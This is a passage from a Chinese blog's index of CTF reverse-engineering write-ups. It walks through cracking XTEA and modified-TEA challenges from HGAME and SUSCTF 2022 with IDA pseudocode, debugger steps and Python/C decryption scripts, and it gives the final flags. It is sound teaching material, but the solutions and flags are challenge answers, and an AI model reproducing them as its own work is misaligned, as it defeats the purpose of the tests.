(_BYTE)v36 == 8 )\n    &#123;\n      *(_QWORD *)&amp;v43 = &amp;unk_4D4F40;\n      *((_QWORD *)&amp;v43 + 1) = &amp;main_statictmp_2;\n      fmt_Fprintln(\n        v0,\n        v20,\n        v25,\n        (unsigned int)&amp;go_itab__os_File_io_Writer,\n        v26,\n        v27,\n        (__int64)&amp;go_itab__os_File_io_Writer,\n        os_Stdout,\n        (__int64)&amp;v43);\n    &#125;\n    else\n    &#123;\n      *(_QWORD *)&amp;v42 = &amp;unk_4D4F40;\n      *((_QWORD *)&amp;v42 + 1) = &amp;main_statictmp_3;\n      fmt_Fprintln(\n        v0,\n        v20,\n        v25,\n        (unsigned int)&amp;go_itab__os_File_io_Writer,\n        v26,\n        v27,\n        (__int64)&amp;go_itab__os_File_io_Writer,\n        os_Stdout,\n        (__int64)&amp;v42);\n    &#125;\n  &#125;\n  else\n  &#123;\n    *(_QWORD *)&amp;v44 = &amp;unk_4D4F40;\n    *((_QWORD *)&amp;v44 + 1) = &amp;main_statictmp_1;\n    fmt_Fprintln(\n      v0,\n      v1,\n      0,\n      (unsigned int)&amp;go_itab__os_File_io_Writer,\n      v9,\n      v10,\n      (__int64)&amp;go_itab__os_File_io_Writer,\n      os_Stdout,\n      (__int64)&amp;v44);\n  &#125;\n&#125;\n\n做这个题的时候确实很蒙，一开始想着F12看一下字符串(因为前面运行的时候有看到有个input flag)，但是啥也没找到，索性就直接搜一下这些函数，抓着第一个函数搜了一下，发现这是GO语言的函数，之前确实没接触过这个语言的题，这里采用的办法是直接动调，选择在fmt_Fprintln函数和fmt_Fscanf的地方都下一个断点(没有为什么看一下输出和输入找找思路)\n\n可以发现动调到call fmt_Fprintln 就弹出了input flag，然后下面的scanf就是接收flag，这里随便乱输入一些东西\n这里F8步过\n\n这里就是根据check函数会有个分支，左边为正确，右边为错误\n这里退出来先分析main_check函数。\n2.main_check函数分析：搜一下这些函数，可以发现有个正则表达式的函数：regexp_MustCompile\nregexp_MustCompile(a1, a2, a3, v8, a5, a6, (__int64)&amp;unk_5041E5, 78LL);\n\n这里调用了一个函数，跟过去看看\n\n这里按a注转一下：\n\nflag&#123;([0-9a-f]&#123;8&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;12&#125;)&#125;\n# flag&#123;12345678-1234-1234-1234-12345678abcd&#125;\n\n注意这里有个正则表达式，这里基本可以确定check函数是判断输入的字符是否符合这个表达式。然后我们继续动调，sacnf时输入符合正则表达时的flag\n\n这里就会跳转到左边的函数了，这次动调遇到跳转选择直接改ZF看一下哪些函数引发跳转\n\n可以发现最后引发跳转在上图函数,先分析main___myCipher__Encrypt函数,这里面的核心代码为：\nwhile ( v16 &lt; 32 )\n&#123;\n  v13 = v14;\n  v18 = v14 + ((v14 >> 5) ^ (16 * v14));\n  v19 = *(_QWORD *)(a7 + 32);\n  v20 = *(_QWORD *)(a7 + 24);\n  v21 = v17;\n  v22 = v17 &amp; 3;\n  if ( v22 >= v19 )\n    runtime_panicindex(v19, v22, v15, a7, v13, v20);\n  v23 = v15 + (v18 ^ (v21 + *(_DWORD *)(v20 + 4 * v22)));\n  v17 = (unsigned int)(v21 + 305419896);\n  v24 = ((unsigned int)v17 >> 11) &amp; 3;\n  if ( v24 >= v19 )\n    runtime_panicindex(v19, v17, v24, a7, v13, v20);\n  ++v16;\n  a1 = (v23 + ((v23 >> 5) ^ (16 * v23))) ^ (v21 + *(_DWORD *)(v20 + 4 * v24) + 305419896);\n  v14 = v13 + a1;\n  v15 = v23;\n&#125;\n\n分析代码类似XXTEA，因为可以看到核心加密在第8行，但可能是ida的问题。加密算法有点奇怪\n\n11行处的异或和正常思路一样只是有些步骤用变量代替，在做异或操作之前先赋好值，后面直接用\n\n如v19 = v15 + ((v15 &gt;&gt; 5) ^ (16 * v15))\n\n\n17行处的异或a1相当于之前笔记的v1，我们大致将这个加密分为两块(异或的左右)\n\n(v23 + ((v23 &gt;&gt; 5) ^ (16 * v23)))和(sum + *(_DWORD *)(key + 4 * v24) + 305419896)\n\n左边倒是中规中矩，v23 * 16 就相当于v23&lt;&lt;4 ,v23也就是笔记里的v0变量\n\n右边就奇怪了，正常情况下代码为：\n(sum + key[(sum&gt;&gt;11) &amp; 3])\n\n\n一开始还奇怪sum为什么还要在后面加一个0x12345678\n但往上面发现正常情况下做完v0的加密后sum并没有进行累加，v0也用的不是sum进行加密而是用的v17,每个循环sum自己虽然没有累加delta值但是每次最开始都被v17赋值了，而v17在做完v0的加密后负责累加\n\n\n\n\n\n到这里可以判断出这就是正常的XTEA加密，Delta的值为0x12345678，目前缺少的值为KEY和加密之后的数据。这里还是继续动调。\n\n变量调整后的函数\nwhile ( v17 &lt; 32 )\n  &#123;\n    v14 = v15;\n    v19 = v15 + ((v15 >> 5) ^ (16 * v15));\n    v20 = *(_QWORD *)(a7 + 32);\n    KEY = *(_QWORD *)(a7 + 24);\n    sum = sum_leijia;\n    v23 = sum_leijia &amp; 3;\n    if ( v23 >= v20 )\n      runtime_panicindex(v20, v23, v16, a7, v14, KEY);\n    v0 = v16 + (v19 ^ (sum + *(_DWORD *)(KEY + 4 * v23)));\n    sum_leijia = (unsigned int)(sum + 0x12345678);\n    v25 = ((unsigned int)sum_leijia >> 11) &amp; 3;\n    if ( v25 >= v20 )\n      runtime_panicindex(v20, sum_leijia, v25, a7, v14, KEY);\n    ++v17;\n    v1 = (v0 + ((v0 >> 5) ^ (16 * v0))) ^ (sum + *(_DWORD *)(KEY + 4 * v25) + 0x12345678);\n    v15 = v14 + v1;\n    v16 = v0;\n  &#125;\n\n3.寻找KEY值：之前对加密函数分析知道，key的赋值在第50行：\nKEY = *(_QWORD *)(a7 + 24);\n\n这里在第51行下一个断点(这里重新调试了一下，做到后面忘记截图了，但重新反汇编的行数有不同)\n\nF9运行\n\n这里双击v20变量\n\n这里转成double word(一个密钥32字节)，得出key值：\n\nkey[4]=&#123;0x10203h,0x4050607h,0x8090A0Bh,0x0C0D0E0Fh&#125;\n\n4.获取加密后的数据：直接在比较函数这里下断点：\n\n跟进去先看一下流程图：(这样可以确认是通过那个比较进行跳转的)\n\n直接在这个跳转地址下断点，我们要提取的值就在上面，但问题来了，不晓得要提取的是哪一个，这里的解决方案是调两次每次输入的flag不想同看哪个寄存器的值变了。\n当flag为：flag&#123;12345678-1234-1234-1234-12345678abcd&#125;\n双击分别查看rsi和，rdi的值：\n\n\n当flag为：flag&#123;11111111-1111-1111-1111-111111111111&#125;\n双击分别查看rsi和，rdi的值：\n\n\n这样一比对就可以发现加密后的数据存在了rdi内。\n进入rdi的数据两次R，换成十六进制，然后提取数据。\n0EC311F045C79AF3EDF5D910542702CB\n\n3.EXP：这里的exp直接在网上找的：\n#include &lt;stdio.h>\n#include &lt;stdint.h>\n/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */\nvoid encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])\n&#123;\n    unsigned int i;\n    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x12345678;\n    for (i=0; i &lt; num_rounds; i++) &#123;\n        v0 += (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]);\n        sum += delta;\n        v1 += (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) &amp; 3]);\n    &#125;\n    v[0]=v0; v[1]=v1;\n&#125;\n \nvoid decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;\n    unsigned int i;\n    uint32_t v0=v[0], v1=v[1], delta=0x12345678, sum=delta*num_rounds;\n    for (i=0; i &lt; num_rounds; i++) &#123;\n        v1 -= (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) &amp; 3]);\n        sum -= delta;\n        v0 -= (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]);\n    &#125;\n    v[0]=v0; v[1]=v1;\n&#125;\n \nint main()\n&#123;\n    uint32_t v_part1[2]=&#123;0x0EC311F0, 0x45C79AF3&#125;; //动调得到的加密后的值,内存中就是小端储存我们不用再手动改变0EC311F0 45C79AF3 EDF5D910 542702CB\n    uint32_t v_part2[2]=&#123;0xEDF5D910, 0x542702CB&#125;;\n    uint32_t const k[4]=&#123;0x10203, 0x4050607, 0x8090A0B, 0x0C0D0E0F&#125;; //动调得到的key\n    unsigned int r=32;//num_rounds建议取值为32// v为要加密的数据是两个32位无符号整数// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位printf(\"加密前原始数据：%u %u\\\\n\",v[0],v[1]);\n    //encipher(r, v, k);\n    //printf(\"加密后的数据：%u %u\\\\n\",v[0],v[1]);\n    decipher(r, v_part1, k);\n    decipher(r, v_part2, k);\n    printf(\"解密后的数据：%x %x %x %x\\\\n\",v_part1[0],v_part1[1], v_part2[0], v_part2[1]);\n    return 0;\n&#125;\n\n\n最后按照开始分析的flag的格式排列一下得到flag{3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e}\n最后贴上主函数内的函数作用：\nfmt_Fprintln：输出：“input flag:”\nfmt_Fscanf：接收flag\nmain_check：判断输入的字符是否符合这个正则表达式：flag&#123;([0-9a-f]&#123;8&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;12&#125;)&#125;\nmain___myCipher__Encrypt：将输入的值进行XTEA加密，需要注意的是这里调用了两次加密函数，其实这里是将明文分成了两段分别进行加密\ninternal_bytealg_Equal：将加密后的值与结果进行比对\n","slug":"Reverse/XTEA逆向题实例","date":"2022-03-19T17:44:25.000Z","categories_index":"Reverse","tags_index":"算法实例分析,WP","author_index":"Big Devils"},{"id":"12c143595e1666b762946cd5d7f66963","title":"TEA逆向题实例2","content":"Creak Me2022年HGAME的re\n1.基本信息探查：1.EXEinfo：32位，无壳\n\n2.运行一下：啥也没有\n\n2.IDA分析：查看主函数：\nint __cdecl main(int argc, const char **argv, const char **envp)\n&#123;\n  int v3; // edx\n  int i; // esi\n  unsigned int v5; // edi\n  unsigned int v6; // ebx\n  int v7; // esi\n  int v8; // esi\n  _DWORD v10[17]; // [esp+Ch] [ebp-8Ch] BYREF\n  __int128 v11[2]; // [esp+50h] [ebp-48h]\n  char Arglist[32]; // [esp+70h] [ebp-28h] BYREF\n  int v13; // [esp+90h] [ebp-8h]\n  int v14; // [esp+94h] [ebp-4h]\n\n  memset(Arglist, 0, sizeof(Arglist));\n  sub_40103A(\"%s\", (char)Arglist);\n  strcpy((char *)v10, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\");\n  v3 = 0;\n  v14 = 0;\n  for ( i = 0; i &lt; 32; v14 = i )\n  &#123;\n    v5 = *(_DWORD *)&amp;Arglist[i];\n    v6 = *(_DWORD *)&amp;Arglist[i + 4];\n    v13 = 0;\n    v7 = 32;\n    do\n    &#123;\n      v3 += 305419896;\n      v5 += v3 ^ (v3 + v6) ^ (v10[2] + 16 * v6) ^ (v10[3] + (v6 >> 5));\n      v6 += v3 ^ (v3 + v5) ^ (v10[0] + 16 * v5) ^ (v10[1] + (v5 >> 5));\n      --v7;\n    &#125;\n    while ( v7 );\n    v8 = v14;\n    v3 = 0;\n    *(_DWORD *)&amp;Arglist[v14] = v5;\n    *(_DWORD *)&amp;Arglist[v8 + 4] = v6;\n    i = v8 + 8;\n  &#125;\n  v11[0] = xmmword_402180;\n  v11[1] = xmmword_402170;\n  while ( Arglist[v3] == *((_BYTE *)v11 + v3) )\n  &#123;\n    if ( ++v3 >= 32 )\n    &#123;\n      sub_40100C(\"right!\", v10[0]);\n      return 0;\n    &#125;\n  &#125;\n  sub_40100C(\"wrong!\", v10[0]);\n  return 0;\n&#125;\n\n粗略一看发现一串base64的码表： “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;” 一开始还以为考的是base64编码，但是仔细一看就发现不对劲，这个字符串存在v10中，而v10在的29行和30行看起来像是TEA加密，发现这一点后就开始找TEA加密的特征。下面分析这个while循环：\ndo\n&#123;\n  v3 += 305419896;\n  v5 += v3 ^ (v3 + v6) ^ (v10[2] + 16 * v6) ^ (v10[3] + (v6 >> 5));\n  v6 += v3 ^ (v3 + v5) ^ (v10[0] + 16 * v5) ^ (v10[1] + (v5 >> 5));\n  --v7;\n&#125;\nwhile ( v7 );\n\n我们所知的TEA一定会有个DELTA变量作为每次异或的值，而v3变量正好也装了一个值，只是转成十六进制后发现值并不是所熟知的0x9E3779B9，而是0x12345678,而且第四第五行也有所改动，多异或了一个v3，正常的加密过程为：\nx += ((y &lt;&lt; 4) + Key[0]) ^ (y + sum) ^ ((y >> 5) + Key[1]);\ny += ((x &lt;&lt; 4) + Key[2]) ^ (x + sum) ^ ((x >> 5) + Key[3]);\n\n可以看到一般的tea加密key的下标分别为0123，解密为2301，而这里刚好翻过来了，加密用的2301，那么解密的exp应该为0123。\n分析到这基本确定这就是一个魔改了的TEA加密，直接写exp就行。\n\n修改变量后的main函数\nint __cdecl main(int argc, const char **argv, const char **envp)\n&#123;\n  int Delta; // edx\n  int i; // esi\n  unsigned int v5; // edi\n  unsigned int v6; // ebx\n  int v7; // esi\n  int v8; // esi\n  _DWORD key[17]; // [esp+Ch] [ebp-8Ch] BYREF\n  __int128 rflag[2]; // [esp+50h] [ebp-48h]\n  char flag[32]; // [esp+70h] [ebp-28h] BYREF\n  int v13; // [esp+90h] [ebp-8h]\n  int v14; // [esp+94h] [ebp-4h]\n\n  memset(flag, 0, sizeof(flag));\n  sub_40103A(\"%s\", (char)flag);\n  strcpy((char *)key, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\");\n  Delta = 0;\n  v14 = 0;\n  for ( i = 0; i &lt; 32; v14 = i )\n  &#123;\n    v5 = *(_DWORD *)&amp;flag[i];\n    v6 = *(_DWORD *)&amp;flag[i + 4];\n    v13 = 0;\n    v7 = 32;\n    do\n    &#123;\n      Delta += 0x12345678;\n      v5 += Delta ^ (Delta + v6) ^ (key[2] + 16 * v6) ^ (key[3] + (v6 >> 5));\n      v6 += Delta ^ (Delta + v5) ^ (key[0] + 16 * v5) ^ (key[1] + (v5 >> 5));\n      --v7;\n    &#125;\n    while ( v7 );\n    v8 = v14;\n    Delta = 0;\n    *(_DWORD *)&amp;flag[v14] = v5;\n    *(_DWORD *)&amp;flag[v8 + 4] = v6;\n    i = v8 + 8;\n  &#125;\n  rflag[0] = xmmword_402180;\n  rflag[1] = xmmword_402170;\n  while ( flag[Delta] == *((_BYTE *)rflag + Delta) )// 退出上面的for循环时这里的Delta变量是置0了的，这里只是单纯的作为一个循环的中间变量\n  &#123;                                                 //还需要注意这里是把rflag转换成unsigned char型一个字节一个字节的注意比较。  \n    if ( ++Delta >= 32 )\n    &#123;\n      sub_40100C(\"right!\", key[0]);\n      return 0;\n    &#125;\n  &#125;\n  sub_40100C(\"wrong!\", key[0]);\n  return 0;\n&#125;\n\n3.EXP：最后的比较是flag和rflag，跟踪40行的rflag的值，这个值就是加密后的值，提取出来作为密文，四个key值的来源为码表，tea的密钥长度为128，分四节，每节32位，所以码表也要一次取四个字节,但这里需要注意一个小端存储的问题：\n.rdata:00402170 xmmword_402170  xmmword 65E0F2E3CF9284AABA5A126DAE1FEDE6h\n.rdata:00402170                                         ; DATA XREF: _main+BD↑r\n.rdata:00402170                                         ; rflag[1]\n.rdata:00402180 xmmword_402180  xmmword 0ED9CE5ED52EB78C2030C144C48D93488h\n.rdata:00402180                                         ; DATA XREF: _main+B0↑r\n.rdata:00402180                                         ; rflag[0]\n\n上面是给rflag赋值时的data段数据，这里直接shift+e提取出来\nrflag[0] = 8834D9484C140C03C278EB52EDE59CED\nrflag[1] = E6ED1FAE6D125ABAAA8492CFE3F2E065\n\n一开始的思路是直接人工分成32位一段，但解过解不出来，回到赋值时的源代码：\nrflag[0] = xmmword_402180;\nrflag[1] = xmmword_402170;\nwhile ( flag[Delta] == *((_BYTE *)rflag + Delta) )// 退出上面的for循环时这里的Delta变量是置0了的，这里只是单纯的作为一个循环的中间变量\n\n这里有个问题就是值是直接存进去的，考虑到每次加密循环是分成了两个32位操作的，以第一段举例如果我编写exp时想让我写的值存储在内存地址时也为8834D948 那么我应该写成：0x48D93488 。\n也可以理解为提取的数据是先处理了一次小端后，在切分成32位一段，将里面的值在小端一次。\n最后exp为：\ndef TeaDecode(enc,k):\n    v0 = enc[0]\n    v1 = enc[1]\n    n = (delta * 32) &amp; 0xFFFFFFFF\n    for i in range(32):\n        v1 -= n ^ (v0 + n) ^ ((v0 &lt;&lt; 4) + k[0]) ^ ((v0 >> 5) + k[1])\n        v1 &amp;= 0xFFFFFFFF\n        v0 -= n ^ (v1 + n) ^ ((v1 &lt;&lt; 4) + k[2]) ^ ((v1 >> 5) + k[3])\n        v0 &amp;= 0xFFFFFFFF\n        n -= delta\n    return (v0, v1)\n\nrflag = [0x48D93488, 0x030C144C, 0x52EB78C2, 0xED9CE5ED, 0xAE1FEDE6, 0xBA5A126D, 0xCF9284AA, 0x65E0F2E3]\nflag = b\"\"\nkey = [0x44434241,0x48474645,0x4C4B4A49,0x504F4E4D]\ndelta = 0x12345678\n\nfor i in range(0,len(rflag),2):        #第三个参数为步进值\n    ans = TeaDecode(rflag[i:i + 2], key)\n    flag += ans[0].to_bytes(4, 'little') + ans[1].to_bytes(4, 'little')  #注意这里要以小端的形式转换\n\nprint(flag)\n\n\nhgame{H4ppy_v4c4ti0n!}\n最后贴一下网上的C语言写的exp，感觉用c方便一点\n#include&lt;Windows.h>\n#include&lt;bits/stdc++.h>\n#include&lt;stdint.h>\nusing namespace std;\n\nconst char* dic=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\nvoid decrypt_tea(DWORD *v5,DWORD *v6)&#123;\n    int32_t sum = 0x12345678*32;\n    for(int i=0; i&lt;32; i++)&#123;\n        *v6 -= sum ^ (sum + *v5) ^ (((DWORD *)dic)[0] + 16 * (*v5)) ^ (((DWORD *)dic)[1] + ((*v5) >> 5));\n        *v5 -= sum ^ (sum + *v6) ^ (((DWORD *)dic)[2] + 16 * (*v6)) ^ (((DWORD *)dic)[3] + ((*v6) >> 5));\n        sum -= 0x12345678;\n    &#125;\n&#125;\n    \nint main()&#123;\n    puts(\"> decrypto\");\n    DWORD cipher[4][2]=&#123;\n        &#123;0x48D93488, 0x030C144C&#125;\n        , &#123;0x52EB78C2, 0xED9CE5ED&#125;\n        , &#123;0xAE1FEDE6, 0xBA5A126D&#125;\n        , &#123;0xCF9284AA, 0x65E0F2E3&#125;\n    &#125;;\n    for(int i=0; i&lt;4; i++)&#123;\n        DWORD v5 = cipher[i][0];\n        DWORD v6 = cipher[i][1];\n        decrypt_tea(&amp;v5, &amp;v6);\n        printf(\"%-4.4s%-4.4s\", (char *)&amp;v5, (char *)&amp;v6);//默认右对齐（+），左对齐为-；因为没有0所以用4.4截断4个字符\n    &#125;//hgame&#123;H4ppy_v4c4ti0n!&#125;\n    return 0;\n&#125;\n","slug":"Reverse/TEA逆向题实例2","date":"2022-03-19T17:38:23.000Z","categories_index":"Reverse","tags_index":"算法实例分析,WP","author_index":"Big Devils"},{"id":"3c99ba7146d6d3d9913c0efbdda7fd72","title":"TEA逆向题实例1","content":"DigitalCircuits2022年SUSCTF的re\nexe→py:\n只要一看到这个图标就晓得大概率是py文件被打包成了exe，而且一般打包后的文件较大。直接用脚本解包。\npyinstxtractor.py DigitalCircuits.exe\n\n\n找到pyc文件之后在线网站反汇编就行\n算法分析：总体预览：反汇编后的代码为：\n#!/usr/bin/env python\n# visit &lt;https://tool.lu/pyc/> for more information\nimport time\n\ndef f1(a, b):\n    if a == '1' and b == '1':      //相当于，按位与操作\n        return '1'\n    return '0'\n\ndef f2(a, b):\n    if a == '0' and b == '0':     //相当于，按位或操作\n        return '0'\n    return '1'\n\ndef f3(a):                        //相当于，按位非操作\n    if a == '1':\n        return '0'\n    if a == '0':\n        return '1'\n\ndef f4(a, b):\n    return f2(f1(a, f3(b)), f1(f3(a), b))    //相当于，按位异或操作\n\ndef f5(x, y, z):\n    s = f4(f4(x, y), z)\n    c = f2(f1(x, y), f1(z, f2(x, y)))\n    return (s, c)\n\ndef f6(a, b):\n    ans = ''\n    z = '0'\n    a = a[::-1]\n    b = b[::-1]\n    for i in range(32):\n        ans += f5(a[i], b[i], z)[0]\n        z = f5(a[i], b[i], z)[1]\n\n    return ans[::-1]\n\ndef f7(a, n):                         //按位左移\n    return a[n:] + '0' * n\n\ndef f8(a, n):                         //按位右移\n    return n * '0' + a[:-n]\n\ndef f9(a, b):\n    ans = ''\n    for i in range(32):\n        ans += f4(a[i], b[i])\n\n    return ans\n\ndef f10(v0, v1, k0, k1, k2, k3):\n    s = '00000000000000000000000000000000'\n    d = '10011110001101110111100110111001'\n    for i in range(32):\n        s = f6(s, d)\n        v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))\n        v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))\n\n    return v0 + v1\n\nk0 = '0100010001000101'.zfill(32)    //zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。\nk1 = '0100000101000100'.zfill(32)\nk2 = '0100001001000101'.zfill(32)\nk3 = '0100010101000110'.zfill(32)\nflag = input('please input flag:')\nif flag[0:7] != 'SUSCTF&#123;' or flag[-1] != '&#125;':      //判断输入是否为SUSCTF&#123;&#125;包裹\n    print('Error!!!The formate of flag is SUSCTF&#123;XXX&#125;')\n    time.sleep(5)\n    exit(0)\nflagstr = flag[7:-1]\nif len(flagstr) != 24:                //实际flag长度为24\n    print('Error!!!The length of flag 24')\n    time.sleep(5)\n    exit(0)\nres = ''\nfor i in range(0, len(flagstr), 8):    //加密\n    v0 = flagstr[i:i + 4]\n    v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8)\n    v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8)\n    res += f10(v0, v1, k0, k1, k2, k3)\n\nif res == '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111':\n    print('True')\nelse:\n    print('False')\ntime.sleep(5)\n\n这里的难点就是识别加密算法，前面之所以定义这么多函数就是掩盖其加密算法的特征，从函数走向分析每一个for的用处(看注释)，分析78行到82行的加密循环\n加密循环分析：for i in range(0, len(flagstr), 8):    //加密\n    v0 = flagstr[i:i + 4]\n    v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8)\n    v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8)\n    res += f10(v0, v1, k0, k1, k2, k3)\n\nbin函数特征：https://magnificent-syrup-61f.notion.site/bin-f80a0f4c76314ae48c883ad8846a971b\n\n每轮循环的v0都是flag的值，每次存4个元素\n通过bin函数以字符串的形式返回每个元素二进制表达形式\n但是bin函数会自作主张的在前面加上0b，所以通过[2:]来切片将0b去掉\n再通过zfill补充去掉的前两位\n\n\nfor循环一次做8个元素，前四个元素放在了放在v0，后四个元素放在v1\nv0和v1都是以字符串的形式保存这元素的二进制表达\n调用f10加密函数，参数为v0，v1和四个key\n\n这里分析一下特征：密钥为128位，明文总共64位，分成两个32位\n符合这个条件的为TEA加密算法。\n为了进一步确认，分析f10函数：\nf10()函数：(TEA加密函数)def f10(v0, v1, k0, k1, k2, k3):\n    s = '00000000000000000000000000000000'\n    d = '10011110001101110111100110111001'\n    for i in range(32):\n        s = f6(s, d)\n        v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))\n        v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))\n\n定义两个变量：分别为s和d，联想到TEA加密算法也是同样的做法(定义sum和detal两个变量)，delta变量放着的是黄黄金分割律数字转换的一个数字 2654435769 （0x9E3779B9）,但这个函数是用二进制的形式表达的计算机换算一下\n\n这里就可以锁定加密算法使用的是TEA了\n确认算法后就可以直接写解密脚本了：\ndef TeaDecode(enc,k):\n    v0 = enc[0]\n    v1 = enc[1]\n    n = (delta * 32) &amp; 0xFFFFFFFF\n    for i in range(32):\n        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + n) ^ ((v0 >> 5) + k[3])\n        v1 &amp;= 0xFFFFFFFF\n        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + n) ^ ((v1 >> 5) + k[1])\n        v0 &amp;= 0xFFFFFFFF\n        n -= delta\n    return (v0, v1)\n\nenflag = '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111'\nenflag = [int(enflag[i:i + 32],2) for i in range(0, len(enflag), 32)]\n\nk = [0] * 4\nk[0] = int('0100010001000101'.zfill(32), 2)    #int(字符串或数字,进制(默认10进制))\nk[1] = int('0100000101000100'.zfill(32), 2)\nk[2] = int('0100001001000101'.zfill(32), 2)\nk[3] = int('0100010101000110'.zfill(32), 2)\ndelta = int('10011110001101110111100110111001', 2)\n\nflag = b''\nfor i in range(0,len(enflag),2):        #第三个参数为步进值\n    ans = TeaDecode(enflag[i:i + 2], k)\n    flag += ans[0].to_bytes(4, 'big') + ans[1].to_bytes(4, 'big')\n\nprint(b'SUSCTF&#123;' + flag + b'&#125;')","slug":"Reverse/TEA逆向题实例1","date":"2022-03-19T17:32:56.000Z","categories_index":"Reverse","tags_index":"算法实例分析,WP","author_index":"Big Devils"},{"id":"65fe6821503e94cfcf38bb466bd2aa3e","title":"TEA系列算法分析及逆向特征","content":"1.TEA:1.TEA简介：“TEA” 的全称为”Tiny Encryption Algorithm”，是一种微型加密算法。TEA算法使用64位的明文分组和128位的密钥，使用feistel分组加框架，需要进行32轮循环得到最后的64位密文，其中magic number DELTA是由黄金分割点。\n2.加解密实现：2.1.加密函数：void Encrypt(long* EntryData, long* Key)\n&#123;\n    //分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组\n    unsigned long x = EntryData[0];\n    unsigned long y = EntryData[1];\n\n    unsigned long sum = 0;\n    unsigned long delta = 0x9E3779B9;\n    //总共加密32轮\n    for (int i = 0; i &lt; 32; i++)\n    &#123;\n        sum += delta;\n        x += ((y &lt;&lt; 4) + Key[0]) ^ (y + sum) ^ ((y >> 5) + Key[1]);\n        y += ((x &lt;&lt; 4) + Key[2]) ^ (x + sum) ^ ((x >> 5) + Key[3]);\n    &#125;\n    //最后加密的结果重新写入到数组中\n    EntryData[0] = x;\n    EntryData[1] = y;\n&#125;\n\n2.2.解密函数：void Decrypt(long* EntryData, long* Key)\n&#123;\n    //分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组\n    unsigned long x = EntryData[0];\n    unsigned long y = EntryData[1];\n\n    unsigned long sum = 0;\n    unsigned long delta = 0x9E3779B9;\n    sum = delta &lt;&lt; 5;   //注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.\n    //总共加密32轮 那么反序也解密32轮\n    for (int i = 0; i &lt; 32; i++)\n    &#123;\n\n// 先将y解开 然后参与运算在解x\n        y -= ((x &lt;&lt; 4) + Key[2]) ^ (x + sum) ^ ((x >> 5) + Key[3]);\n        x -= ((y &lt;&lt; 4) + Key[0]) ^ (y + sum) ^ ((y >> 5) + Key[1]);\n        sum -= delta;\n    &#125;\n    //最后加密的结果重新写入到数组中\n    EntryData[0] = x;\n    EntryData[1] = y;\n&#125;\nC语言实现TEA加密：#include &lt;stdio.h>\n#include &lt;stdlib.h>\n#include &lt;Windows.h>\n\nvoid Encrypt(long* EntryData, long* Key)\n&#123;\n    //分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组\n    unsigned long x = EntryData[0];\n    unsigned long y = EntryData[1];\n\n    unsigned long sum = 0;\n    unsigned long delta = 0x9E3779B9;\n    //总共加密32轮\n    for (int i = 0; i &lt; 32; i++)\n    &#123;\n        sum += delta;\n        x += ((y &lt;&lt; 4) + Key[0]) ^ (y + sum) ^ ((y >> 5) + Key[1]);\n        y += ((x &lt;&lt; 4) + Key[2]) ^ (x + sum) ^ ((x >> 5) + Key[3]);\n    &#125;\n    //最后加密的结果重新写入到数组中\n    EntryData[0] = x;\n    EntryData[1] = y;\n&#125;\n\nvoid Decrypt(long* EntryData, long* Key)\n&#123;\n    //分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组\n    unsigned long x = EntryData[0];\n    unsigned long y = EntryData[1];\n\n    unsigned long sum = 0;\n    unsigned long delta = 0x9E3779B9;\n    sum = delta &lt;&lt; 5;   //注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.\n    //总共加密32轮 那么反序也解密32轮\n    for (int i = 0; i &lt; 32; i++)\n    